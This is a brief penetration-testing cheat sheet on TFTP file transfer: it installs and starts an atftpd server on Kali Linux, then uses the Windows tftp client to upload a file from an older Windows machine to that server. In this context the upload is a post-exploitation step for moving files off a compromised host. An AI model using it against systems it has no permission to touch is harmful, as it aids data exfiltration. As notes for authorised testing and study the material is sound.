# TFTP

## Overview

* works from older Windows operating systems up to Windows XP and 2003
* not viable in anything newer due to TFTP not coming installed by default

## How To

```bash
# Setup TFTP on Kali Linux
sudo apt update && sudo apt install atftp

# Decide where you want to keep the TFTP files
sudo mkdir /tftp

# Update ownership
sudo chown nobody: /tftp

# Start the service as a daemon on port 69
sudo atftpd --daemon --port 69 /tftp

# Now on the Window's machine
# -i : binary image transfer
# put : upload a file
tftp -i 10.10.10.10 put file2upload.txt
```
